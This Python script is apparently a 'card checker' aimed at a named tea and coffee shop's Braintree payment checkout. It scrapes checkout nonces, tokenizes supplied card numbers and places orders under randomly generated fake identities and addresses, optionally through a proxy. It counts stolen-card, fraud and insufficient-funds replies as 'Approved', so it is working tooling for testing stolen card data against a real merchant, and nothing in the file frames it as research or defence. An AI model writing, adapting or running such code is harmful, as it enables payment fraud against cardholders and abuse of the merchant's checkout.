import httpx
import re
import random
import base64
import string
import time
import urllib.parse


SITE = "https://www.tea-and-coffee.com"
BT_GQL = "https://payments.braintree-api.com/graphql"
PRODUCT_ID = "932"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first), random.choice(last)


def _random_uk_address():
    data = [
        ("14 Oxford Street", "London", "SW1A 1AA"),
        ("27 Baker Street", "London", "NW1 6XE"),
        ("8 King Street", "Manchester", "M2 4WU"),
        ("33 High Street", "Edinburgh", "EH1 1SR"),
        ("12 Castle Road", "Bristol", "BS1 3AD"),
        ("45 Park Lane", "Birmingham", "B1 1BB"),
        ("19 Queen Street", "Cardiff", "CF10 2BU"),
        ("6 Church Lane", "Leeds", "LS1 3AA"),
    ]
    street, city, postcode = random.choice(data)
    return street, city, postcode


async def _get_bt_auth(client, checkout_html):
    decoded = urllib.parse.unquote(checkout_html)

    cn_match = re.search(r'client_token_nonce["\s:]+["\s]*([a-f0-9]{10})', decoded)
    if not cn_match:
        cn_match = re.search(r'client_token_nonce":"([^"]+)"', decoded)

    if cn_match:
        nonce = cn_match.group(1)
        r_token = await client.post(
            f"{SITE}/wp-admin/admin-ajax.php",
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": nonce,
            },
        )
        if r_token.status_code == 200:
            try:
                resp = r_token.json()
                if "data" in resp:
                    dec = base64.b64decode(resp["data"]).decode("utf-8")
                    auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                    if auth_m:
                        return auth_m.group(1)
            except Exception:
                pass

    all_nonces = re.findall(r'"nonce":"([a-f0-9]{8,12})"', checkout_html)
    for n in all_nonces:
        r_try = await client.post(
            f"{SITE}/wp-admin/admin-ajax.php",
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": n,
            },
        )
        if r_try.status_code == 200:
            try:
                resp = r_try.json()
                if resp.get("success") and "data" in resp:
                    dec = base64.b64decode(resp["data"]).decode("utf-8")
                    auth_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                    if auth_m:
                        return auth_m.group(1)
            except Exception:
                continue

    return None


async def _tokenize_card(client, auth, cc, mm, yy, cvv):
    bt_headers = {
        "authorization": f"Bearer {auth}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.randint(10**9, 10**10 - 1)),
        },
        "query": TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }

    r = await client.post(BT_GQL, headers=bt_headers, json=payload)
    if r.status_code != 200:
        return None, None, f"Tokenization HTTP {r.status_code}"

    data = r.json()
    if "errors" in data and data["errors"]:
        msg = data["errors"][0].get("message", "Tokenization failed")
        return None, None, msg

    cc_data = data.get("data", {}).get("tokenizeCreditCard", {})
    if not cc_data or not cc_data.get("token"):
        return None, None, "No token returned"

    token = cc_data["token"]
    card_info = cc_data.get("creditCard", {})
    return token, card_info, None


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bin_data = card_info.get("binData", {})
    country = bin_data.get("countryOfIssuance", "??")
    bank = bin_data.get("issuingBank", "Unknown")
    debit = bin_data.get("debit", "UNKNOWN")
    prepaid = bin_data.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{brand} {card_type} | {country} | {bank} | {last4}"


def _classify_response(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds", "limit exceeded", "limit_exceeded",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"

    return "Declined"


async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, postcode = _random_uk_address()
    email = _random_email()
    phone = "07" + "".join(random.choices(string.digits, k=9))

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:

            await client.get(SITE)

            await client.post(
                f"{SITE}/?add-to-cart={PRODUCT_ID}",
                data={"add-to-cart": PRODUCT_ID, "quantity": "1"},
            )

            r_checkout = await client.get(f"{SITE}/checkout/")
            checkout_html = r_checkout.text

            bt_auth = await _get_bt_auth(client, checkout_html)

            if not bt_auth:
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not get Braintree auth [{elapsed}s]"

            token, card_info, err = await _tokenize_card(client, bt_auth, cc, mm, yy, cvv)
            if err:
                elapsed = round(time.time() - start, 2)
                result = _classify_response(err)
                return f"{result} - {err} [{elapsed}s]"

            info = _parse_card_info(card_info) if card_info else "??"

            pm_name = "braintree_credit_card"
            pm_match = re.search(r'"(braintree[_a-z]*credit[_a-z]*card)"', checkout_html)
            if pm_match:
                pm_name = pm_match.group(1)

            checkout_data = {
                "billing_first_name": first,
                "billing_last_name": last,
                "billing_company": "",
                "billing_country": "GB",
                "billing_address_1": street,
                "billing_address_2": "",
                "billing_city": city,
                "billing_state": "",
                "billing_postcode": postcode,
                "billing_phone": phone,
                "billing_email": email,
                "order_comments": "",
                "payment_method": pm_name,
                "wc-braintree-credit-card-card-nonce": token,
                "wc-braintree-credit-card-device-data": "{}",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": "{}",
                "terms": "on",
                "terms-field": "1",
            }

            checkout_headers = {
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": SITE,
                "Referer": f"{SITE}/checkout/",
            }

            r_submit = await client.post(
                f"{SITE}/?wc-ajax=checkout",
                data=checkout_data,
                headers=checkout_headers,
            )

            elapsed = round(time.time() - start, 2)

            try:
                resp = r_submit.json()
            except Exception:
                return f"Error - Invalid checkout response [{elapsed}s]"

            result_str = resp.get("result", "")
            messages = resp.get("messages", "")

            if result_str == "success":
                return f"Approved - Auth Passed | {info} [{elapsed}s]"

            if result_str == "failure" and messages:
                errors = re.findall(r'<li[^>]*>(.*?)</li>', messages, re.DOTALL)
                if errors:
                    err_text = re.sub(r'<[^>]+>', '', errors[0]).strip()
                else:
                    err_text = re.sub(r'<[^>]+>', '', messages).strip()[:120]

                status = _classify_response(err_text)
                return f"{status} - {err_text} | {info} [{elapsed}s]"

            if "error" in str(resp).lower():
                err_text = re.sub(r'<[^>]+>', '', str(messages)).strip()[:120]
                return f"Declined - {err_text} | {info} [{elapsed}s]"

            return f"Error - Unexpected response [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:100]} [{elapsed}s]"
